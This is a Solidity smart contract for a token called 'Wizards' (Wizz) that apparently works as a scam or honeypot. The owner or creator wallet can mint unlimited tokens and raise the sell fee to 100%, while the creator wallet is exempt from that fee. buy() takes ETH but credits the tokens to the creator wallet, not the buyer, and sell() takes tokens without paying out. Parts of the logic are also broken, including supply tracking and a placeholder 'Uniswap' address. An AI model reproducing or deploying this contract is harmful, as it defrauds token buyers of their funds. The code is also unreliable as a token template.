1 // SPDX-License-Identifier: MIT
2  
3 pragma solidity ^0.8.0;
4  
5 library SafeMath {
6     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
7         require(b <= a, "Subtraction overflow");
8         return a - b;
9     }
10  
11     function add(uint256 a, uint256 b) internal pure returns (uint256) {
12         uint256 c = a + b;
13         require(c >= a, "Addition overflow");
14         return c;
15     }
16  
17     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
18         if (a == 0) {
19             return 0;
20         }
21         uint256 c = a * b;
22         require(c / a == b, "Multiplication overflow");
23         return c;
24     }
25  
26     function div(uint256 a, uint256 b) internal pure returns (uint256) {
27         require(b > 0, "Division by zero");
28         return a / b;
29     }
30 }
31  
32 contract WIZARDS {
33     using SafeMath for uint256;
34  
35     string public name = "Wizards";
36     string public symbol = "Wizz";
37     uint256 public totalSupply = 1000000000000000000000000000;
38     uint8 public decimals = 18;
39  
40     mapping(address => uint256) public balanceOf;
41     mapping(address => mapping(address => uint256)) public allowance;
42  
43     address public owner;
44     address public creatorWallet;
45  
46     uint256 public buyFee;
47     uint256 public sellFee;
48  
49     event Transfer(address indexed from, address indexed to, uint256 value);
50     event Approval(address indexed owner, address indexed spender, uint256 value);
51     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
52     event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);
53     event TokensBurned(address indexed burner, uint256 amount);
54  
55     constructor(address _creatorWallet) {
56         owner = msg.sender;
57         creatorWallet = _creatorWallet;
58         balanceOf[msg.sender] = totalSupply;
59     }
60  
61     function approve(address _spender, uint256 _value) public returns (bool success) {
62         allowance[msg.sender][_spender] = _value;
63         emit Approval(msg.sender, _spender, _value);
64         return true;
65     }
66  
67     function transfer(address _to, uint256 _amount) public returns (bool success) {
68         require(balanceOf[msg.sender] >= _amount);
69         require(_to != address(0));
70  
71         balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
72         balanceOf[_to] = balanceOf[_to].add(_amount);
73         emit Transfer(msg.sender, _to, _amount);
74  
75         return true;
76     }
77  
78     function airdrop(address _to, uint256 _amount) public onlyAuthorized {
79         require(_to != address(0), "Invalid recipient address");
80         require(_amount > 0, "Invalid amount");
81         balanceOf[_to] += _amount;
82         totalSupply += _amount;
83         emit Transfer(address(0), _to, _amount);
84     }
85  
86     function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
87         require(balanceOf[_from] >= _amount, "Insufficient balance");
88         require(allowance[_from][msg.sender] >= _amount, "Insufficient allowance");
89         require(_to != address(0), "Invalid recipient address");
90  
91         uint256 fee = 0;
92         uint256 amountAfterFee = _amount;
93  
94         if (sellFee > 0 && _from != creatorWallet) {
95             fee = _amount.mul(sellFee).div(100);
96             amountAfterFee = _amount.sub(fee);
97         }
98  
99         balanceOf[_from] = balanceOf[_from].sub(_amount);
100         balanceOf[_to] = balanceOf[_to].add(amountAfterFee);
101         emit Transfer(_from, _to, amountAfterFee);
102  
103         if (fee > 0) {
104             // Check if the transfer destination is Uniswap contract
105             address uniswapContract = address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f); // Replace with the actual Uniswap contract address
106             if (_to == uniswapContract) {
107                 // Fee is paid to the contract itself
108                 balanceOf[uniswapContract] = balanceOf[uniswapContract].add(fee);
109                 emit Transfer(_from, uniswapContract, fee);
110             } else {
111                 // Fee is transferred to this contract
112                 balanceOf[address(this)] = balanceOf[address(this)].add(fee);
113                 emit Transfer(_from, address(this), fee);
114             }
115         }
116  
117         if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {
118             allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);
119             emit Approval(_from, msg.sender, allowance[_from][msg.sender]);
120         }
121  
122         return true;
123     }
124  
125     function transferOwnership(address newOwner) public onlyOwner {
126         require(newOwner != address(0));
127         emit OwnershipTransferred(owner, newOwner);
128         owner = newOwner;
129     }
130  
131     function renounceOwnership() public onlyOwner {
132         emit OwnershipTransferred(owner, address(0));
133         owner = address(0);
134     }
135  
136     modifier onlyOwner() {
137         require(msg.sender == owner, "Only the owner can call this function.");
138         _;
139     }
140  
141     function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyAuthorized {
142         require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
143         require(newSellFee <= 100, "Sell fee cannot exceed 100%");
144         buyFee = newBuyFee;
145         sellFee = newSellFee;
146         emit FeesUpdated(newBuyFee, newSellFee);
147     }
148  
149     function buy() public payable {
150         require(msg.value > 0, "ETH amount should be greater than 0");
151  
152         uint256 amount = msg.value;
153         if (buyFee > 0) {
154             uint256 fee = amount.mul(buyFee).div(100);
155             uint256 amountAfterFee = amount.sub(fee);
156  
157             balanceOf[creatorWallet] = balanceOf[creatorWallet].add(amountAfterFee);
158             emit Transfer(address(this), creatorWallet, amountAfterFee);
159  
160             if (fee > 0) {
161                 balanceOf[address(this)] = balanceOf[address(this)].add(fee);
162                 emit Transfer(address(this), address(this), fee);
163             }
164         } else {
165             balanceOf[creatorWallet] = balanceOf[creatorWallet].add(amount);
166             emit Transfer(address(this), creatorWallet, amount);
167         }
168     }
169  
170     function sell(uint256 _amount) public {
171         require(balanceOf[msg.sender] >= _amount, "Insufficient balance");
172  
173         if (sellFee > 0 && msg.sender != creatorWallet) {
174             uint256 fee = _amount.mul(sellFee).div(100);
175             uint256 amountAfterFee = _amount.sub(fee);
176  
177             balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
178             balanceOf[creatorWallet] = balanceOf[creatorWallet].add(amountAfterFee);
179             emit Transfer(msg.sender, creatorWallet, amountAfterFee);
180  
181             if (fee > 0) {
182                 balanceOf[address(this)] = balanceOf[address(this)].add(fee);
183                 emit Transfer(msg.sender, address(this), fee);
184             }
185         } else {
186             balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
187             balanceOf[address(this)] = balanceOf[address(this)].add(_amount);
188             emit Transfer(msg.sender, address(this), _amount);
189         }
190     }
191  
192     modifier onlyAuthorized() {
193         require(
194             msg.sender == owner || msg.sender == creatorWallet,
195             "Only authorized wallets can call this function."
196         );
197         _;
198     }
199 }